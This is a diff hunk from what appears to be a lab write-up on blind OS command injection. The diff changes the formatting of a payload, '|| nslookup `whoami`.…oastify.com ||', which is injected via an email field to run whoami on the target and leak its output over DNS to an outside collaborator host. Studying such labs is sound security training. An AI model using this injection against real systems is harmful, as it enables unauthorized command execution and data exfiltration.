@@ -20,7 +20,7 @@ Awesome, we got the DNS interaction
 
 ![]({{ site.baseurl }}/assets/images/os-13.png)
 
-Now, let's kinda fine tune the payload like **|| nslookup `whoami`.m0nc1evdkdpq2lzcalmyvzxnmes6gw4l.oastify.com ||** where the backticks will act as a inline execution of bash commands over there 
+Now, let's kinda fine tune the payload like `|| nslookup `whoami`.m0nc1evdkdpq2lzcalmyvzxnmes6gw4l.oastify.com ||` where the backticks will act as a inline execution of bash commands over there 
 
 Resend the payload through the `email` field and looking into the collaborator found that the `whoami` executed 
 
